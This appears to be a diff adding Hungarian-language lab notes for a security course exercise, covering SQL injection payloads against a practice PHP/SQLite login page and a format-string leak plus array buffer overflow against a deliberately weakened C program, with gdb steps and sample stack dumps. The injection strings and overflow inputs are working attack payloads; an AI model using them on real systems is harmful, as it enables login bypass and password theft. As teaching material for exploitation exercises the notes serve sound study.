@@ -1,0 +1,70 @@
+sql injection
+kell apache2 (van kalin) és php sqlite-al (sudo apt-get install php5-sqlite; /etc/init.d/apache2 restart)
+
+login jelszó nélkül EHA';#
+Date mező:
+' union select 1, name from sqlite_master where type = 'table';#  --> milyen táblák vannak a db-ben
+' union select name, sql from sqlite_master where type = 'table';# ---> oszlopok
+' union select name, pwd from users;
+
+MD5
+
+
+
+
+
+gcc -m32 prog.c -o prog -DMESSAGE=\"NeptunTheBest\" -DSECRET=318 -fno-stack-protector
+
+prog.c
+SECRET értéke
+MESSAGE értéke
+
+
+ha van bináris a legegyszerűbba  gdb-ből kinézni:
+gdb prog
+
+disas main  --> a cmp utasításnál látszik mivel hasonlítja össze --> SECRET
+
+break *addr (ahol addr a cmp előtti memóriacím) A breakpointnál megállva át fogjuk írni a regiszter értékét így az összehasonlítás true lesz, belép az if-be és kiírja a MESSAGE-t
+
+run - futtatás, elér a breakpointhoz
+
+info register
+set $eax=valami szám
+continue --> kiírja
+
+Ha nincs bináris marad a sérülékenységek kihasználása
+SECRET értéke: tudjuk hogy a két lokális változó egymás mellé kerül a veremben
+Inputnak beadunk valami ilyet: 
+AAAAAAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+
+ekkor jópár bájt mélyen belemászik a verembe. Remélhetőleg valahol meglátjuk az A-k hexadecimális kódjait (41)  --> 0000013e.41414141.25414141  Secret:0000013e
+
+MESSAGE: megszerzéséhez bele kell mennünk az if true ágába
+SECRET értékének módosítása: 
+- lehetne a printf által (%n) ha tudnánk a memóriacímét
+- lehet bufferoverflowval: a számtömbbe annyi számot olvasunk be, hogy végül eljutunk a secret lokális változóhoz és felülírjuk. Addig viszont a többi értéket ne módosítsuk, hogy a verem működőképes maradjon 
+Pl:
+Input: AAAAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+
+::AAAAAAAf75280e4.f7560e51.f76d8000.f771215b.f76d8000.f7520940.00000000.ff96a8a8.f7718790.00000000.00000000.00000000.080483d0.ff96a8a8.080485df.ff96a7a0.00000100.f76d8600.00000000.08048281.f63d4e2e.f7524ed4.0000013e.41414141.25414141.2e783830.78383025.3830252e.30252e78.252e7838.
+darabszam: 18
+0:1 - normál tömbelem
+1:1 - normál tömbelem
+2:1 - normál tömbelem
+3:1 - normál tömbelem
+4:12 --> 18 hexadecimálisan
+5:6 --> a ciklusváltozó értékét se rontsuk el
+6:0       
+7:080483d0
+8:ff96a8a8
+9:080485df
+10:ff96a7a0
+11:00000100
+12:f76d8600
+13:00000000
+14:08048281
+15:f63d4e2e
+16:f7524ed4
+17:00000131 --> módosítás csak itt
+
